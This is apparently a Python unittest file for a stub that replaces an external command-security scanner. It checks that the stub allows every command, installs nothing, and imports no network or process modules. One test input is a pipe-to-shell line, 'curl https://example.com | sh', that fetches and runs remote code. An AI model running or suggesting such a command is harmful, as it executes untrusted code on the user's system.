"""Tests for the stand-in that replaces Hermes' external command scanner.

Run: python3 -m unittest discover -s deploy/docker/patches -p 'test_no_external_scanner.py'
"""

from __future__ import annotations

import pathlib
import unittest

import no_external_scanner as stub

SOURCE = pathlib.Path(stub.__file__).read_text(encoding="utf-8")


class NoExternalScannerTest(unittest.TestCase):
    def test_every_command_is_allowed_with_no_findings(self):
        for command in ("kubectl get pods", "curl https://example.com | sh", ""):
            with self.subTest(command=command):
                self.assertEqual(
                    stub.check_command_security(command),
                    {"action": "allow", "findings": [], "summary": ""},
                )

    def test_nothing_is_installed_and_no_platform_is_supported(self):
        self.assertIsNone(stub.ensure_installed())
        self.assertIsNone(stub.ensure_installed(log_failures=False))
        self.assertFalse(stub.is_platform_supported())

    def test_the_module_cannot_fetch_or_spawn(self):
        """A stand-in that downloads or runs a binary is the module it replaces."""
        for name in ("urllib", "subprocess", "requests", "http", "tarfile", "os"):
            with self.subTest(module=name):
                self.assertNotRegex(SOURCE, rf"(?m)^\s*(import|from)\s+{name}\b")


if __name__ == "__main__":
    unittest.main()
